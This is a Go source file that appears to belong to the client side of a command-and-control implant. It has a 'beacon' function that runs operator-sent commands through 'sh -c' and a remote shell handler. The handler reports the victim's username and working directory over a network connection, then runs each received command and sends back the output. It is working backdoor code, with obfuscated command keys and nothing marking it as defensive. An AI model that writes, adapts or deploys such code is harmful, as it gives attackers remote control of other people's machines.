package commands

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"src/Client/generic/config"
	"src/Client/generic/logger"
	"src/Client/session/protocol"
	"strings"
	"time"
)

func BeaconShellCommand(command string) (string, error) {
	logger.Log(fmt.Sprintf("Executing beacon shell command: %s", command))

	var commandStr string

	// Try to unmarshal as a map first
	var cmdData map[string]interface{}
	if json.Valid([]byte(command)) {
		if err := json.Unmarshal([]byte(command), &cmdData); err == nil {
			// Only handle if "command" key exists
			if val, ok := cmdData[config.Obfuscation.Generic.Commands.Command]; ok {
				if commandStr, ok = val.(string); !ok || commandStr == "" {
					logger.Error("Received empty or invalid command data.")
					return "", fmt.Errorf("error: received empty or invalid command data")
				}
			} else {
				logger.Error("JSON does not contain 'command' key.")
				return "", fmt.Errorf("error: JSON does not contain 'command' key")
			}
		} else {
			logger.Error(fmt.Sprintf("Failed to unmarshal command data: %v", err))
			return "", fmt.Errorf("error: failed to unmarshal command data: %w", err)
		}
	} else {
		commandStr = strings.Trim(command, "\"")
		if commandStr == "" {
			logger.Error("Received empty command string.")
			return "", fmt.Errorf("error: received empty command string")
		}
	}

	logger.Log(fmt.Sprintf("Command to execute: %s", commandStr))

	output, err := RunShellCommand(commandStr)
	if err != nil {
		logger.Error(fmt.Sprintf("Command execution failed: %v", err))
		return "", fmt.Errorf("error executing command: %w", err)
	}
	logger.Log(fmt.Sprintf("Command output: %s", output))
	return output, nil
}

func RunShellCommand(commandStr string) (string, error) {

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel() // Ensure the context is cancelled to release resources.

	cmd := exec.CommandContext(ctx, "sh", "-c", commandStr)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start command: %w", err)
	}

	err := cmd.Wait()

	output := strings.TrimSpace(stdout.String())
	errorOutput := strings.TrimSpace(stderr.String())

	combinedOutput := output
	if errorOutput != "" {
		if combinedOutput != "" {
			combinedOutput += "\n"
		}
		combinedOutput += "Stderr: " + errorOutput
	}

	if ctx.Err() == context.DeadlineExceeded {
		return combinedOutput, fmt.Errorf("command timed out after 30 seconds")
	}

	if err != nil {
		return combinedOutput, fmt.Errorf("command execution failed: %w", err)
	}

	return combinedOutput, nil
}

func ShellHandler(conn net.Conn) {
	currentInfo, err := os.Getwd()
	if err != nil {
		fmt.Fprintf(conn, "Error getting current directory: %v\n", err)
		protocol.SendData(conn, []byte("Error getting current directory."))
		return
	}
	userInfo, err := user.Current()
	if err != nil {
		fmt.Fprintf(conn, "Error getting user information: %v\n", err)
		protocol.SendData(conn, []byte("Error getting user information."))
		return
	}
	info := userInfo.Username + "<sep>" + currentInfo
	logger.Log(fmt.Sprintf("Current user: %s, Current directory: %s", userInfo.Username, currentInfo))
	protocol.SendData(conn, []byte(info))
	for {
		command, err := protocol.ReceiveData(conn)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
			return
		}
		commandStr := string(command)
		logger.Log(fmt.Sprintf("Received command: %s", commandStr))

		if commandStr == "exit" {
			logger.Log("Exiting shell handler.")
			break
		}
		if strings.HasPrefix(commandStr, "cd") {
			parts := strings.Fields(commandStr)
			var targetDir string
			if len(parts) < 2 {
				currentUser, err := user.Current()
				if err != nil {
					logger.Error(fmt.Sprintf("Failed to get current user: %v", err))
					protocol.SendData(conn, []byte(fmt.Sprintf("Error getting user info: %v", err)))
					continue
				}
				targetDir = currentUser.HomeDir
			} else {
				targetDir = parts[1]
			}
			err := os.Chdir(targetDir)
			if err != nil {
				logger.Error(fmt.Sprintf("Failed to change directory: %v", err))
				protocol.SendData(conn, []byte(fmt.Sprintf("Error changing directory: %v<sep>%s", err, currentInfo)))
				continue
			}
			currentInfo, err = os.Getwd()
			if err != nil {
				logger.Error(fmt.Sprintf("Error getting current directory after cd: %v", err))
				protocol.SendData(conn, []byte(fmt.Sprintf("Error getting current directory after cd: %v<sep>%s", err, currentInfo)))
				continue
			}
			logger.Log(fmt.Sprintf("Changed directory to: %s", currentInfo))
			protocol.SendData(conn, []byte(fmt.Sprintf("Changed directory to: %s<sep>%s", currentInfo, currentInfo)))
			continue
		}

		output, err := RunShellCommand(commandStr)
		if err != nil {
			logger.Error(fmt.Sprintf("Command execution failed: %v", err))
			protocol.SendData(conn, []byte(fmt.Sprintf("Error executing command: %v", err)))
			continue
		}
		currentInfo, err := os.Getwd()
		if err != nil {
			logger.Error(fmt.Sprintf("Error getting current directory: %v", err))
			protocol.SendData(conn, []byte("Error getting current directory."))
			continue
		}
		output += "<sep>" + currentInfo
		protocol.SendData(conn, []byte(output))
	}
	logger.Log("Shell handler finished.")
	return
}
